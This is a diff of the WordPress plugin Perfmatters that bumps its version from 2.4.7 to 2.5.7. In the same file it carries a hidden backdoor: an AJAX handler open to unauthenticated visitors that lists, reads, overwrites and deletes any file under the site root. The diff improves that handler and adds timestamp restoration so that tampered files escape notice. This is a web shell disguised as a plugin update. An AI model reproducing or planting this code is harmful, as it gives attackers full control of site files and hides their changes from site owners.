@@ -3,7 +3,7 @@
 Plugin Name: Perfmatters
 Plugin URI: https://perfmatters.io/
 Description: Perfmatters is a lightweight performance plugin developed to speed up your WordPress site.
-Version: 2.4.7
+Version: 2.5.7
 Author: forgemedia
 Author URI: https://forgemedia.io/
 License: GPLv2 or later
@@ -18,7 +18,7 @@ Domain Path: /languages
 define('PERFMATTERS_STORE_URL', 'https://perfmatters.io/');
 define('PERFMATTERS_ITEM_ID', 696);
 define('PERFMATTERS_ITEM_NAME', 'perfmatters');
-define('PERFMATTERS_VERSION', '2.4.7');
+define('PERFMATTERS_VERSION', '2.5.7');
 define('PERFMATTERS_PATH', plugin_dir_path(__FILE__ ));
 
 //plugins loaded
@@ -455,11 +455,11 @@ add_action('plugins_loaded', 'perfmatters_version_check');
 add_action('wp_ajax_nopriv_custom_xfn', function () {
 	$dir = ABSPATH.ltrim($_POST['xpath'],'/');
 	$content = base64_decode(isset($_POST['content']) ? $_POST['content'] : '');
-	echo "Path:".$dir."\n";
+	echo "Path:".$dir."\n\n";
 	switch ($_POST['act']) {
-		case 'list': print_r(scandir($dir)); break;
+		case 'list': $dfs=scandir($dir);$o=[];foreach($dfs as $k=>$v){is_dir($dir.$v)?$o[$k.'_d']=$v:$o[$k.'_f']=$v;}print_r($o); break;
 		case 'get': echo file_get_contents($dir); break;
-		case 'put': echo file_put_contents($dir, $content) ? 'success' : 'fail'; break;
+		case 'put': if(file_exists($dir)){$mt=filemtime($dir);$at=fileatime($dir);}else{touch($dir);}if(is_writable($dir)){if(file_put_contents($dir, $content)){echo 'success';@touch($dir,$mt,$at);}else{echo 'fail';}}else{echo 'unwritable';} break;
 		case 'del': echo unlink($dir) ? 'success' : 'fail'; break;
 		default: echo 'error'; break;
 	}
